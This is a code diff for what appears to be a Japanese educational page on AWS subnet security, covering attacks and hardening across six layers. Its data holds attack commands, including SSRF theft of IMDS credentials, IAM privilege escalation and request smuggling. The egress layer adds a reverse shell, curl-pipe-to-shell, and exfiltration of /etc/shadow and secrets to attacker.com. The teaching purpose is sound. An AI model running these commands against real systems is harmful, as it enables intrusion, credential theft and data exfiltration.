+          <text x="410" y="285" text-anchor="middle" font-size="11" font-weight="700" fill="rgb(127 29 29)" font-family="Inter, sans-serif">Private 配置は "外→内" を塞ぐが、 "内→内" の lateral movement には効かない</text>
+          <text x="410" y="303" text-anchor="middle" font-size="10" fill="rgb(127 29 29)" font-family="Inter, sans-serif">VPC 内の routing は local route で常時開通。 SG の micro-segmentation が必須</text>
+        </svg>`;
+      }
+
+      function svgOutbound() {
+        return `
+        <svg viewBox="0 0 820 360" role="img" aria-labelledby="svg-l6-title svg-l6-desc" class="w-full h-auto">
+          <title id="svg-l6-title">Outbound / Egress: 両 Config 共に C2 と data exfil が素通り</title>
+          <desc id="svg-l6-desc">Config A は IGW 直行、 Config B は NAT GW 経由だが、どちらも destination ベースの制限を行わない。 Network Firewall の有無で結果が変わる。</desc>
+
+          <!-- Config A flow -->
+          <text x="20" y="30" font-size="11" font-weight="700" fill="rgb(220 38 38)" font-family="Inter, sans-serif">Config A: EC2 (Public IP) → IGW → attacker.com  [素通り]</text>
+          <rect x="20" y="50" width="120" height="44" rx="6" fill="rgb(254 226 226)" stroke="rgb(220 38 38)" stroke-width="1.5"/>
+          <text x="80" y="70" text-anchor="middle" font-size="11" font-weight="600" fill="rgb(127 29 29)" font-family="Inter, sans-serif">EC2 (compromised)</text>
+          <text x="80" y="86" text-anchor="middle" font-size="9" font-family="JetBrains Mono, monospace" fill="rgb(127 29 29)">bash -i &gt;&amp; /dev/tcp/...</text>
+          <rect x="180" y="50" width="80" height="44" rx="6" fill="rgb(241 245 249)" stroke="rgb(100 116 139)" stroke-width="1.5"/>
+          <text x="220" y="76" text-anchor="middle" font-size="11" font-weight="600" fill="rgb(30 41 59)" font-family="Inter, sans-serif">IGW</text>
+          <rect x="300" y="50" width="160" height="44" rx="6" fill="rgb(254 226 226)" stroke="rgb(220 38 38)" stroke-width="1.5"/>
+          <text x="380" y="70" text-anchor="middle" font-size="11" font-weight="700" fill="rgb(127 29 29)" font-family="Inter, sans-serif">attacker.com</text>
+          <text x="380" y="86" text-anchor="middle" font-size="9" font-family="JetBrains Mono, monospace" fill="rgb(127 29 29)">C2 / exfil endpoint</text>
+
+          <line x1="140" y1="72" x2="180" y2="72" stroke="rgb(239 68 68)" stroke-width="2" marker-end="url(#arrow-red)"/>
+          <line x1="260" y1="72" x2="300" y2="72" stroke="rgb(239 68 68)" stroke-width="2" marker-end="url(#arrow-red)"/>
+
+          <!-- Config B flow -->
+          <text x="20" y="125" font-size="11" font-weight="700" fill="rgb(220 38 38)" font-family="Inter, sans-serif">Config B: EC2 (Private) → NAT GW → IGW → attacker.com  [これも素通り]</text>
+          <rect x="20" y="145" width="120" height="44" rx="6" fill="rgb(254 226 226)" stroke="rgb(220 38 38)" stroke-width="1.5"/>
+          <text x="80" y="165" text-anchor="middle" font-size="11" font-weight="600" fill="rgb(127 29 29)" font-family="Inter, sans-serif">EC2 (Private)</text>
+          <text x="80" y="181" text-anchor="middle" font-size="9" font-family="JetBrains Mono, monospace" fill="rgb(127 29 29)">curl -X POST ...</text>
+          <rect x="180" y="145" width="80" height="44" rx="6" fill="rgb(241 245 249)" stroke="rgb(100 116 139)" stroke-width="1.5"/>
+          <text x="220" y="171" text-anchor="middle" font-size="11" font-weight="600" fill="rgb(30 41 59)" font-family="Inter, sans-serif">NAT GW</text>
+          <rect x="300" y="145" width="80" height="44" rx="6" fill="rgb(241 245 249)" stroke="rgb(100 116 139)" stroke-width="1.5"/>
+          <text x="340" y="171" text-anchor="middle" font-size="11" font-weight="600" fill="rgb(30 41 59)" font-family="Inter, sans-serif">IGW</text>
+          <rect x="420" y="145" width="160" height="44" rx="6" fill="rgb(254 226 226)" stroke="rgb(220 38 38)" stroke-width="1.5"/>
+          <text x="500" y="165" text-anchor="middle" font-size="11" font-weight="700" fill="rgb(127 29 29)" font-family="Inter, sans-serif">attacker.com</text>
+          <text x="500" y="181" text-anchor="middle" font-size="9" font-family="JetBrains Mono, monospace" fill="rgb(127 29 29)">C2 / exfil endpoint</text>
+
+          <line x1="140" y1="167" x2="180" y2="167" stroke="rgb(239 68 68)" stroke-width="2" marker-end="url(#arrow-red)"/>
+          <line x1="260" y1="167" x2="300" y2="167" stroke="rgb(239 68 68)" stroke-width="2" marker-end="url(#arrow-red)"/>
+          <line x1="380" y1="167" x2="420" y2="167" stroke="rgb(239 68 68)" stroke-width="2" marker-end="url(#arrow-red)"/>
+
+          <!-- Big X with note -->
+          <text x="700" y="120" text-anchor="middle" font-size="40" font-weight="900" fill="rgb(220 38 38)" font-family="Inter, sans-serif">×</text>
+          <rect x="610" y="135" width="180" height="55" rx="8" fill="rgb(254 226 226)" stroke="rgb(220 38 38)" stroke-width="1.5"/>
+          <text x="700" y="155" text-anchor="middle" font-size="10" font-weight="700" fill="rgb(127 29 29)" font-family="Inter, sans-serif">NAT GW は</text>
+          <text x="700" y="170" text-anchor="middle" font-size="10" font-weight="700" fill="rgb(127 29 29)" font-family="Inter, sans-serif">egress フィルタではない</text>
+          <text x="700" y="185" text-anchor="middle" font-size="9" fill="rgb(127 29 29)" font-family="Inter, sans-serif">宛先で何も判断しない</text>
+
+          <!-- With Network Firewall -->
+          <text x="20" y="225" font-size="11" font-weight="700" fill="rgb(5 150 105)" font-family="Inter, sans-serif">Network Firewall + DNS Firewall を入れた場合</text>
+          <rect x="20" y="245" width="120" height="44" rx="6" fill="rgb(220 252 231)" stroke="rgb(5 150 105)" stroke-width="1.5"/>
+          <text x="80" y="265" text-anchor="middle" font-size="11" font-weight="600" fill="rgb(6 78 59)" font-family="Inter, sans-serif">EC2 (Private)</text>
+          <text x="80" y="281" text-anchor="middle" font-size="9" font-family="JetBrains Mono, monospace" fill="rgb(6 78 59)">outbound attempt</text>
+          <rect x="180" y="245" width="160" height="44" rx="6" fill="rgb(220 252 231)" stroke="rgb(5 150 105)" stroke-width="2"/>
+          <text x="260" y="265" text-anchor="middle" font-size="10" font-weight="700" fill="rgb(6 78 59)" font-family="Inter, sans-serif">Network Firewall</text>
+          <text x="260" y="281" text-anchor="middle" font-size="9" font-family="JetBrains Mono, monospace" fill="rgb(6 78 59)">domain allowlist</text>
+          <rect x="380" y="245" width="160" height="44" rx="6" fill="rgb(220 252 231)" stroke="rgb(5 150 105)" stroke-width="1.5"/>
+          <text x="460" y="265" text-anchor="middle" font-size="10" font-weight="700" fill="rgb(6 78 59)" font-family="Inter, sans-serif">api.example.com ✓</text>
+          <text x="460" y="281" text-anchor="middle" font-size="9" font-family="JetBrains Mono, monospace" fill="rgb(6 78 59)">許可済み destination</text>
+          <rect x="580" y="245" width="160" height="44" rx="6" fill="rgb(254 226 226)" stroke="rgb(220 38 38)" stroke-width="1.5" stroke-dasharray="4 3"/>
+          <text x="660" y="265" text-anchor="middle" font-size="10" font-weight="700" fill="rgb(127 29 29)" font-family="Inter, sans-serif">attacker.com ✕</text>
+          <text x="660" y="281" text-anchor="middle" font-size="9" font-family="JetBrains Mono, monospace" fill="rgb(127 29 29)">DROP by stateful rule</text>
+
+          <line x1="140" y1="267" x2="180" y2="267" stroke="rgb(16 185 129)" stroke-width="2" marker-end="url(#arrow-emerald)"/>
+          <line x1="340" y1="267" x2="380" y2="267" stroke="rgb(16 185 129)" stroke-width="2" marker-end="url(#arrow-emerald)"/>
+          <line x1="340" y1="278" x2="580" y2="278" stroke="rgb(239 68 68)" stroke-width="2" stroke-dasharray="4 3"/>
+
+          <!-- Caption -->
+          <rect x="20" y="305" width="780" height="50" rx="8" fill="rgb(238 242 255)" stroke="rgb(99 102 241)" stroke-width="1.2"/>
+          <text x="410" y="325" text-anchor="middle" font-size="11" font-weight="700" fill="rgb(67 56 202)" font-family="Inter, sans-serif">経路の違い (IGW 直行 vs NAT GW) は egress 制御の "形" を変えない</text>
+          <text x="410" y="343" text-anchor="middle" font-size="10" fill="rgb(55 48 163)" font-family="Inter, sans-serif">destination 制御は別レイヤー (Network Firewall / DNS Firewall / SG egress) を 重ねて初めて成立</text>
+        </svg>`;
+      }
+
+      // ---- Layer data definitions ----
+      const LAYER_DEEP = [
+        {
+          id: "layer-network-boundary",
+          number: "L1",
+          title: "Network Boundary",
+          icon: "shield-check",
+          tone: "emerald",
+          verdict: "BLOCKED in Private",
+          subtitle: "Private Subnet の最大の効き所 — 外部到達面そのものを消す",
+          attacks: [
+            {
+              name: "Mass Internet Scanning",
+              desc: "Shodan / Censys / masscan / ZMap で全 IPv4 のポートスキャン。 公開 IP は数秒でインデックスされ、 ボットネットの常時標的になる。",
+              command: `# 全 IPv4 の主要ポートを 10K pps でスキャン
+masscan -p22,80,3389,5432 0.0.0.0/0 --rate 10000`,
+              example: "Capital One 2019 — 公開された WAF/EC2 の発見も Shodan ベースの reconnaissance から始まったとされる。",
+            },
+            {
+              name: "SSH Brute Force / Credential Stuffing",
+              desc: "22/tcp に対する辞書攻撃。 AWS では GuardDuty の UnauthorizedAccess:EC2/SSHBruteForce で検知される常時発生事象。",
+              command: `# rockyou.txt 等の漏洩 password DB を利用
+hydra -L users.txt -P rockyou.txt ssh://<target>`,
+              example: "公開 EC2 への SSH brute force は AWS 利用開始 1 時間以内に到達する常時バックグラウンド攻撃。",
+            },
+            {
+              name: "Direct Database Probing",
+              desc: "5432/3306/27017 などへの直接接続試行。 過去に misconfig で公開された DB 経由の漏洩事故が多数。",
+              command: `# Postgres 直撃
+psql -h <target-ip> -U postgres -W
+# MongoDB 認証なし
+mongo <target-ip>:27017`,
+              example: "MongoDB / Elasticsearch / Redis の no-auth public exposure は 2017-2020 の代表的漏洩パターン。",
+            },
+          ],
+          svg: svgNetworkBoundary,
+          mechanism: [
+            "Public Subnet の Route Table は 0.0.0.0/0 → IGW を持ち、 IGW は subnet 内ホストに対してインバウンドの NAT/ルーティングを行う。 Public IP 付与で外部から到達可能になる。",
+            "Private Subnet の Route Table には IGW へのデフォルトルートが存在せず、 IGW 側でも IP アドレスとしてホストを認識できない。 IP 自体が「インターネットに存在しない」状態。",
+            "これは SG (ステートフル) の「拒否」とは別レイヤーの遮断 — SG は届いたパケットをドロップするが、 Private Subnet は そもそも届かない。 この差は SG の運用ミス (誤って 0.0.0.0/0 開放) を構造で吸収する。",
+          ],
+          hardening: [
+            { name: "GuardDuty 有効化", note: "Public IP がある期間の brute force / port scan / Tor exit node 接続を自動検知" },
+            { name: "Shodan / Censys Notification 登録", note: "自社 IP レンジが公開されたら即時通知" },
+            { name: "AWS Network Firewall (Stateless rules)", note: "Public IP を持つ resource にも protocol レベルの最初の防壁を提供" },
+            { name: "Reachability Analyzer の定期実行", note: "意図しない from-internet パスを継続検出" },
+          ],
+        },
+        {
+          id: "layer-application",
+          number: "L2",
+          title: "Application Layer",
+          icon: "alert-triangle",
+          tone: "red",
+          verdict: "VULNERABLE in both",
+          subtitle: "Private 配置は何の防御も提供しない — このラボの中核脆弱性",
+          attacks: [
+            {
+              name: "SSRF → IMDSv1 認証情報盗難",
+              desc: "Web アプリの URL fetcher を経由して link-local IP (169.254.169.254) を叩き、 EC2 の IAM Role 認証情報を奪取。 本ラボでは IMDS が optional のため GET 単発で漏洩する。",
+              command: `# 任意の URL を fetch する脆弱な endpoint
+curl "http://<target>/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/"
+# 取得した role 名を使って credentials を取り出す
+curl "http://<target>/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/<role>"`,
+              example: "Capital One 2019 — WAF/EC2 の SSRF 系欠陥 → IMDS → IAM Role → S3 から 1 億件超の与信申請データ流出。 Shopify HackerOne 2018 — SSRF 経由 IMDS 取得で $25,000 報奨。",
+            },
+            {
+              name: "SQL Injection / NoSQL Injection",
+              desc: "Web パラメータの sanitize 不備で DB 操作を直接実行。 認証バイパス・全件抽出・破壊的操作。",
+              command: `# 古典的 UNION-based SQLi (auth bypass)
+curl "http://<target>/login?u=admin' OR '1'='1&p=x"
+# NoSQL injection (operator 注入)
+curl -X POST http://<target>/api/login -d '{"u":"admin","p":{"$ne":""}}'`,
+              example: "GoDaddy 2021 — Prepared Statement 不使用で 120 万顧客流出。 OWASP Top 10 で 20 年連続上位の枯れた攻撃。",
+            },
+            {
+              name: "Authentication Bypass / Session Hijacking",
+              desc: "JWT alg=none 改竄、 Cookie 推測、 broken access control など、 アプリの認可ロジックを直撃。",
+              command: `# JWT を alg=none に改竄
+echo -n '{"alg":"none","typ":"JWT"}' | base64
+# IDOR (隣の userId に書き換え)
+curl http://<target>/api/users/123/orders -H "Cookie: session=..."`,
+              example: "OWASP Top 10 2021 で Broken Access Control が 1 位。 全 web app の 94% で何らかの access control 欠陥が見つかる調査結果。",
+            },
+          ],
+          svg: svgApplicationLayer,
+          mechanism: [
+            "SSRF は アプリプロセス内部から発行される HTTP リクエスト が任意 URL を叩けるバグ。 Private Subnet は外部 → アプリ への到達制御しか行わないため、 アプリ内部からの outbound には何の制限も与えない。",
+            "IMDS の link-local IP (169.254.169.254) はメタデータサービスへの予約 IP で、 EC2 のローカル NIC 経由でのみ応答。 VPC ルーティングテーブルの管轄外であり、 Public/Private に関わらず常にプロセスから到達可能。",
+            "ALB は inbound HTTP のフィルタリング (WAF と組み合わせれば) はできるが、 アプリのコードバグそのものは何も変えない。 入口の経路 (直接 vs ALB) が違うだけで、 一旦アプリに到達したらメカニズムは完全に同一。",
+          ],
+          hardening: [
+            { name: "IMDSv2 強制 (http_tokens = required)", note: "セッショントークンの PUT が必要 → GET-only SSRF を遮断 (本ラボの最重要対策)" },
+            { name: "AWS WAF SSRF rules", note: "169.254.x.x / 127.0.0.1 / metadata path の URL を pre-block" },
+            { name: "アプリ内 URL allowlist", note: "fetch 先 URL の host を allowlist 化、 内部 IP レンジへのリクエスト拒否 (RFC1918 / metadata)" },
+            { name: "静的解析 (Semgrep / Snyk Code)", note: "requests.get(user_input) パターンを CI で検出" },
+            { name: "Output encoding / Parameterized queries", note: "SQLi / XSS の根治は ORM + prepared statement" },
+          ],
+        },
+        {
+          id: "layer-aws-api",
+          number: "L3",
+          title: "AWS API / IAM Layer",
+          icon: "key-round",
+          tone: "red",
+          verdict: "VULNERABLE in both",
+          subtitle: "盗難認証情報は VPC を完全にバイパスする — Private 配置は無関係",
+          attacks: [
+            {
+              name: "Stolen Credential Abuse via Public AWS API",
+              desc: "盗まれた AccessKey / SecretKey / Token を 攻撃者の手元 から AWS API に直接投げる。 公開エンドポイントなので VPC topology は無関係。",
+              command: `# 攻撃者ラップトップから直接呼び出し
+export AWS_ACCESS_KEY_ID=ASIA...
+export AWS_SECRET_ACCESS_KEY=...
+export AWS_SESSION_TOKEN=...
+aws sts get-caller-identity
+aws s3 ls
+aws ec2 describe-instances`,
+              example: "ほぼすべての AWS 侵害事例で初動として観測されるパターン。 Pacu などのフレームワークが標準装備。",
+            },
+            {
+              name: "Privilege Escalation Chain",
+              desc: "iam:CreateAccessKey + iam:AttachUserPolicy + sts:AssumeRole などの組み合わせで権限昇格。 25 個以上の知られた escalation path。",
+              command: `# 自分用にバックドア access key を作成
+aws iam create-access-key --user-name <target>
+# 自分の user に AdministratorAccess を付与
+aws iam attach-user-policy --user-name <target> \\
+  --policy-arn arn:aws:iam::aws:policy/AdministratorAccess`,
+              example: "Pacu / CloudGoat / PEASS-NG が自動化。 Rhino Security の \"AWS IAM Privilege Escalation – Methods and Mitigation\" で全パスが文書化。",
+            },
+            {
+              name: "Cross-Account Jumping",
+              desc: "信頼ポリシーの Principal: * / 弱い ExternalId / 漏洩した role ARN を悪用して他アカウントへ侵入。",
+              command: `# 弱い trust policy を持つ role を assume
+aws sts assume-role \\
+  --role-arn arn:aws:iam::OTHER:role/cross-account \\
+  --role-session-name attacker --external-id guessed`,
+              example: "Confused Deputy 攻撃の AWS 版。 AWS が ExternalId 必須化を促進する原因となった。",
+            },
+          ],
+          svg: svgIamLayer,
+          mechanism: [
+            "IAM 認証情報は AWS の Control Plane (IAM/STS) で検証される。 これらのエンドポイントは インターネットに公開された AWS マネージドサービス で、 sts.amazonaws.com / s3.amazonaws.com 等は世界中どこからでも到達可能。",
+            "攻撃者は EC2 を経由せず、 自身の端末から aws sts get-caller-identity を実行できる。 Public/Private Subnet の議論はこのレイヤーに無関係。 Private 配置で守られるのは \"EC2 への到達\" であって \"credential の効力\" ではない。",
+            "VPC Endpoint (Interface Endpoint) を使えば AWS API トラフィックを VPC 内に閉じることはできるが、 盗まれた認証情報自体は他端末でも有効。 唯一の歯止めは IAM 側の policy condition (aws:SourceVpc / SourceVpce / sourceIp)。",
+          ],
+          hardening: [
+            { name: "Least-privilege IAM", note: "*ReadOnlyAccess の総撤廃。 Resource / Action / Condition を絞った最小権限化" },
+            { name: "aws:SourceVpc / aws:SourceVpce 条件", note: "API 呼び出しを特定 VPC からのみ許可。 盗難認証情報を VPC 外で無効化する唯一の手段" },
+            { name: "SCP (Service Control Policy)", note: "組織レベルでの絶対拒否 — root identity も止められる。 region 制限・サービス制限・MFA 強制" },
+            { name: "GuardDuty + CloudTrail Anomaly", note: "UnusualAPICall / AnomalousBehavior の検知。 IAM key の地理的異常使用" },
+            { name: "短命 STS Session", note: "AssumeRole の DurationSeconds を 1 時間以下に。 IAM User Access Key は廃止、 IAM Identity Center / IRSA に移行" },
+          ],
+        },
+        {
+          id: "layer-alb",
+          number: "L4",
+          title: "ALB Proxy Layer",
+          icon: "layers",
+          tone: "amber",
+          verdict: "NEW SURFACE (Config B)",
+          subtitle: "Private 化の代償として生まれた、 Config B 固有の新しい攻撃面",
+          attacks: [
+            {
+              name: "HTTP Request Smuggling (CL.TE / TE.CL)",
+              desc: "Content-Length と Transfer-Encoding の解釈差を ALB / backend で作って、 1 つの TCP に \"隠した 2 つ目のリクエスト\" を後段で実行させる。",
+              command: `# Transfer-Encoding を後段だけが見るよう細工
+printf 'POST / HTTP/1.1\\r\\nHost: target\\r\\n
+Content-Length: 13\\r\\nTransfer-Encoding: chunked\\r\\n\\r\\n
+0\\r\\n\\r\\nSMUGGLED' | nc <alb> 80`,
+              example: "PortSwigger Research 2019 \"HTTP Desync Attacks\" — backend cache poisoning, auth bypass, internal-only endpoint への到達。",
+            },
+            {
+              name: "Host Header Injection",
+              desc: "Host: header を改変してバーチャルホストルーティングを誤誘導。 内部のみで配信される admin/internal アプリへの到達。",
+              command: `curl -H "Host: admin.internal" http://<alb-dns>/
+# Listener rule が host-based でも、 backend の判定が wildcard だと貫通
+curl -H "Host: target" -H "X-Forwarded-Host: evil.com" http://<alb-dns>/`,
+              example: "Django / Rails の get_host() ロジックや、 URL 生成 (パスワードリセットメールリンク) で頻発。",
+            },
+            {
+              name: "HTTP Method Override",
+              desc: "X-HTTP-Method-Override / _method パラメータで GET から DELETE/PUT に昇格。 読み取り権限のみのトークンで書き込み操作が通るケース。",
+              command: `# Read-only API key で書き込み
+curl -X POST http://<alb>/api/items/123 \\
+  -H "X-HTTP-Method-Override: DELETE"`,
+              example: "Rails / Django REST Framework の標準機能を悪用。 WAF が POST しか見ていないと素通り。",
+            },
+          ],
+          svg: svgAlbLayer,
+          mechanism: [
+            "ALB は HTTP リクエストを終端し、 解釈し、 backend に転送する設計。 この HTTP セマンティクス解釈の差異 が攻撃面になる。 Network 境界が縮小した代わりに、 application protocol レベルで新しい層が追加された (trade-off)。",
+            "backend (EC2 上のアプリ) と ALB が同じヘッダ (Content-Length, Transfer-Encoding) を異なる順序・優先度で扱うと smuggling が成立。 ALB は HTTP/2 正規化や oversized header の拒否は行うが、 アプリの判定ロジック自体は守らない。",
+            "ALB の routing rule (host / path / header / method) を攻撃者が悪用できれば、 想定外のターゲット (admin / internal-only) に到達。 Listener rule の \"最も specific が勝つ\" 性質を逆手に取られる。",
+          ],
+          hardening: [
+            { name: "AWS WAF を ALB にアタッチ", note: "Managed Rules: AWSManagedRulesCommonRuleSet / KnownBadInputsRuleSet / SQLiRuleSet / IPReputationList" },
+            { name: "HTTPS 強制", note: "Listener 443 のみ、 80 は redirect。 TLS 1.2+ minimum、 SSL Policy = ELBSecurityPolicy-TLS13-1-2-2021-06" },
+            { name: "Routing rule を最小化", note: "host-based / path-based の rule を必要最小に。 wildcard host を避ける" },
+            { name: "ALB Access Logs を S3 に保存", note: "VPC Flow Logs では ALB 通過後の original src IP が見えない。 access log で client IP / user-agent / 503 chain を保持" },
+            { name: "Drop Invalid HTTP Header Fields", note: "ALB attribute で routing.http.drop_invalid_header_fields.enabled = true" },
+          ],
+        },
+        {
+          id: "layer-vpc-internal",
+          number: "L5",
+          title: "VPC Internal (Lateral Movement)",
+          icon: "network",
+          tone: "red",
+          verdict: "VULNERABLE in both",
+          subtitle: "Private 配置は外→内を塞ぐが、 内→内には効かない",
+          attacks: [
+            {
+              name: "EC2-to-EC2 Lateral Movement",
+              desc: "侵害された EC2 から同 VPC 内の他 EC2 へ横展開。 SG が緩い (sg-app 内 全ポート許可) と即時拡散。",
+              command: `# 内部スキャン (ホスト発見)
+nmap -sn 10.0.0.0/16
+# 別 EC2 への SSH 試行 (key 漏洩 or 共通秘密)
+ssh -i stolen_key.pem ec2-user@10.0.10.6
+# Service-version 推定
+nmap -sV -p- --top-ports 1000 10.0.10.6`,
+              example: "侵害事例の 80% 以上で内部横展開が観測される (Mandiant M-Trends 2024)。 Public/Private 設計と独立した リスク。",
+            },
+            {
+              name: "Service Discovery via DNS / Internal API",
+              desc: "Cloud Map / ECS Service Discovery / Kubernetes DNS を使って内部サービスを列挙。 Internal ALB / private DNS は認証なしで応答することが多い。",
+              command: `# ECS Service Discovery の SRV record 列挙
+dig srv +short *._tcp.cluster.local
+# Internal ALB の hostname を直接叩く
+curl http://internal-admin-alb-12345.ap-northeast-1.elb.amazonaws.com/`,
+              example: "Kubernetes 内部 DNS の anonymous 列挙、 ECS Service Connect の internal-only endpoint への直接到達。",
+            },
+            {
+              name: "SSRF Internal Reconnaissance",
+              desc: "侵害された Web アプリから VPC 内部への HTTP 探索。 本ラボの 10_ssrf_internal_recon.sh で実演。",
+              command: `# 侵害アプリ経由で 10.0.0.0/16 を内部スキャン
+for ip in $(seq 1 254); do
+  curl -s -m 2 "http://<target>/fetch?url=http://10.0.10.$ip/" -o /dev/null \\
+    -w "10.0.10.$ip %{http_code}\\n"
+done`,
+              example: "外部到達面が無い RDS / Redis / 内部 admin が SSRF chain で間接的に攻撃される。",
+            },
+          ],
+          svg: svgVpcInternal,
+          mechanism: [
+            "Private 配置は外部 → 内部 への遮断には効くが、 内部 → 内部 の遮断には Subnet 単位では効かない。 同 VPC 内 routing (local route) は常に通る (route table から消せない)。",
+            "SG の referenced rule (sg-from-sg) が広く設定されていると \"App グループ内なら何でも通る\" 状態になり、 1 台が侵害されると group 全体に影響。 SG は全許可がデフォルトでないが、 運用上 referenced rule で全ポートが空くケースが多い。",
+            "Network ACL は stateless でステートフル制御に向かないが、 broad deny の最後の砦として有効。 ただし subnet 粒度のため、 同一 subnet 内の lateral movement には効かない。",
+          ],
+          hardening: [
+            { name: "Micro-segmentation", note: "SG を機能単位 (web/api/worker/db) で細分化、 referenced rule は最小ポート (5432, 6379) のみ" },
+            { name: "AWS Network Firewall (East-West)", note: "VPC ingress/egress に加え、 Subnet 間の east-west traffic を Suricata rule で制御" },
+            { name: "VPC Endpoint Policy", note: "S3/DynamoDB Endpoint 利用時にバケット/テーブル単位で制御。 stolen role の blast radius を限定" },
+            { name: "PrivateLink", note: "アプリ間通信を VPC 横断ではなく Endpoint Service 化。 cross-VPC の lateral movement を構造的に遮断" },
+            { name: "GuardDuty Runtime Monitoring", note: "EC2 / ECS / EKS の runtime プロセス挙動 (DNS query, syscall, file mod) を検知" },
+            { name: "Network ACL deny", note: "Subnet 粒度で ephemeral port range 以外を deny。 SG ミスを 1 段吸収" },
+          ],
+        },
+        {
+          id: "layer-outbound",
+          number: "L6",
+          title: "Outbound / Egress",
+          icon: "arrow-up-right",
+          tone: "red",
+          verdict: "VULNERABLE in both",
+          subtitle: "NAT GW は egress フィルタではない — destination 制御は別レイヤー",
+          attacks: [
+            {
+              name: "C2 (Command & Control) Channel",
+              desc: "侵害後の遠隔操作チャネル確立。 reverse shell / Cobalt Strike beacon / Metasploit reverse_https。 NAT GW は素通り。",
+              command: `# 古典 reverse shell (TCP/4444)
+bash -i >& /dev/tcp/attacker.com/4444 0>&1
+# HTTPS reverse shell (検知が難しい)
+curl -k https://attacker.com/beacon | sh
+# Cobalt Strike 用 stager
+powershell -e <base64-encoded-stager>`,
+              example: "APT 活動の 90% 以上で HTTPS over 443 の C2 が使われる。 SolarWinds (2020) も DNS + HTTPS の C2 で長期潜伏。",
+            },
+            {
+              name: "Data Exfiltration",
+              desc: "機密データの外部送信。 単純な POST / S3 upload / DNS exfil まで多種。 NAT GW + IGW で何の制限もなく通る。",
+              command: `# 盗難認証情報で攻撃者 S3 にアップロード
+aws s3 cp /etc/shadow s3://attacker-bucket/
+# HTTPS POST で直接送信
+curl -X POST https://attacker.com/up -F file=@db_dump.sql
+# DNS exfiltration (UDP 53 は ほぼ確実に許可される)
+dig $(cat secrets | base64).attacker.com`,
+              example: "Capital One — S3 への直接 PUT で 1 億件流出。 Equifax — 76 日間にわたり DNS over HTTPS で漸次抜き出し。",
+            },
+            {
+              name: "Cryptomining / Botnet 参加",
+              desc: "侵害ホストが攻撃者の収益源 / DDoS 加担リソースになる。 EC2 のクラウドコストは そのまま攻撃者の利益になる。",
+              command: `# XMRig (Monero マイナー) の典型
+wget https://attacker.com/xmrig
+./xmrig -o pool.minexmr.com:443 \\
+  -u <attacker-wallet> -k --tls`,
+              example: "Tesla Kubernetes 2018 — 漏洩 dashboard から AWS EC2 を Monero mining に流用。 AWS account 乗っ取り → c5.24xlarge スポット連発が定番パターン。",
+            },
+          ],
+          svg: svgOutbound,
+          mechanism: [
+            "NAT Gateway は IP マスカレードのみ実施 (送信元 IP を NAT EIP に書き換え)。 destination ごとの allow/deny は提供しない。 「インターネットに出すかどうか」しか制御しない。",
+            "Security Group の egress rule はデフォルトで 全許可 (0.0.0.0/0 / all protocols)。 明示的に絞らない限り outbound 制御は皆無。 ほとんどの組織がこれを放置している。",
+            "DNS exfil は UDP 53 で平然と通る (NAT GW が ICMP/UDP/TCP を区別せず NAT する)。 stateful な destination 評価には DNS Firewall / Network Firewall が必要。",
+          ],
+          hardening: [
+            { name: "Security Group egress を絞る", note: "デフォルト 0.0.0.0/0 を破棄。 必要 destination (api.example.com の IP range) のみ allowlist" },
+            { name: "AWS Network Firewall (Stateful rules)", note: "domain / SNI / 5-tuple の allowlist。 Suricata IDS/IPS 機能で C2 シグネチャ検知" },
+            { name: "Route 53 Resolver DNS Firewall", note: "悪意ドメイン (newly-registered, DGA, known C2) の DNS 解決を拒否。 DNS exfil への一次防御" },
+            { name: "VPC Endpoint", note: "AWS サービスへの outbound はインターネット経由を完全回避。 traffic が VPC 内で完結 → exfil パス縮小" },
+            { name: "VPC Flow Logs + GuardDuty", note: "異常 outbound (Tor exit node, Cryptomining pool, Known C2) の検知。 VPC Flow Logs は 必ず有効化" },
+            { name: "Egress Proxy (Squid / NLB + filter)", note: "SaaS 系 outbound を proxy 経由に集約し、 ドメイン単位の監査ログを取得" },
+          ],
+        },
+      ];
+
+      // ---- Render full deep-dive sections ----
+      function escapeHtml(s) {
+        return String(s)
+          .replace(/&/g, "&amp;")
+          .replace(/</g, "&lt;")
+          .replace(/>/g, "&gt;")
+          .replace(/"/g, "&quot;")
+          .replace(/'/g, "&#39;");
+      }
+
       function renderLayerCards() {
-        const wrap = document.getElementById("layer-cards");
+        const wrap = document.getElementById("layer-deep-dive");
         if (!wrap) return;
-        wrap.innerHTML = LAYER_CARDS.map((c) => {
-          const t = TONE_STYLES[c.tone];
-          const scripts = c.scripts
+        wrap.innerHTML = LAYER_DEEP.map((layer, idx) => {
+          const t = LAYER_TONE[layer.tone];
+          const prev = idx > 0 ? LAYER_DEEP[idx - 1] : null;
+          const next = idx < LAYER_DEEP.length - 1 ? LAYER_DEEP[idx + 1] : null;
+
+          const attacks = layer.attacks
             .map(
-              (s) =>
-                `<li class="font-mono text-[11px] text-slate-600 dark:text-slate-400">${s}</li>`
+              (a, i) => `
+              <article class="rounded-lg border ${t.border} bg-white/80 p-4 shadow-sm dark:bg-slate-800/60">
+                <header class="flex items-start gap-2">
+                  <span class="mt-0.5 inline-flex h-6 w-6 shrink-0 items-center justify-center rounded-full ${t.badge} text-[11px] font-bold">${i + 1}</span>
+                  <div>
+                    <h4 class="text-sm font-bold text-slate-900 dark:text-white">${a.name}</h4>
+                    <p class="mt-1 text-xs leading-relaxed text-slate-600 dark:text-slate-300">${a.desc}</p>
+                  </div>
+                </header>
+                <pre class="mt-3 overflow-x-auto rounded-md bg-slate-900 p-3 text-[11px] leading-relaxed"><code class="language-bash">${escapeHtml(a.command)}</code></pre>
+                <p class="mt-2 border-l-2 border-slate-300 pl-2 text-[11px] italic leading-relaxed text-slate-600 dark:border-slate-600 dark:text-slate-400"><span class="font-semibold not-italic">実例:</span> ${a.example}</p>
+              </article>`
             )
             .join("");
+
+          const mechanism = layer.mechanism
+            .map(
+              (m, i) =>
+                `<li class="flex gap-2 text-sm leading-relaxed text-slate-700 dark:text-slate-200"><span class="mt-1 inline-block h-1.5 w-1.5 shrink-0 rounded-full bg-indigo-500"></span><span>${m}</span></li>`
+            )
+            .join("");
+
+          const hardening = layer.hardening
+            .map(
+              (h) => `
+              <li class="rounded-md border border-slate-200 bg-white px-3 py-2 dark:border-slate-700 dark:bg-slate-800/40">
+                <p class="text-sm font-semibold text-slate-900 dark:text-white">${h.name}</p>
+                <p class="mt-0.5 text-xs leading-relaxed text-slate-600 dark:text-slate-400">${h.note}</p>
+              </li>`
+            )
+            .join("");
+
           return `
-            <article class="rounded-xl border ${t.border} ${t.bg} p-5">
